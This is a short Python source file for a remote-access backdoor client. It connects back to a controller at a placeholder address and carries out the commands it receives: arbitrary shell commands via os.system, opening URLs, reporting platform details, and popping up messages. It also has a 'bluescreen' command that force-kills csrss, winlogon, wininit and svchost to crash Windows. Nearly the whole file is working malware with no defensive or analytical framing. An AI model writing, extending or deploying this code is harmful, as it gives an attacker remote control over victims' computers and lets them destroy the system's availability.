import frontdoor
import platform
import os
import requests
import webbrowser
import time
from threading import Thread

sock=frontdoor.Client()
def check():
    while True:
        time.sleep(0.8)
        if sock.check():
            break
        else:
            iport = ["ip", "port"]
            sock.setconnect(iport[0].strip(), int(iport[1].strip()))

t=Thread(target=check)
t.daemon=True
t.start()

for recv in sock.recv():
    if recv == "info":
        sock.send("{}\n".format(platform.platform()).encode("utf-8"))

    if recv.startswith("os:"):
        try:
            os.system(recv[3:])
            sock.send(True)
        except Exception as e:
            sock.send(False)
    
    if recv.startswith("wb:"):
        webbrowser.open(recv[3:])
        sock.send(True)

    if recv=="bluescreen":
        os.system("taskkill /F /IM csrss.exe")
        os.system("taskkill /F /IM svchost.exe")
        os.system("taskkill /F /IM wininit.exe")
        os.system("taskkill /F /IM winlogon.exe")
        sock.send(True)

    if recv.startswith("msg:"):
        os.system("msg * /v "+recv[4:])
        sock.send(True)
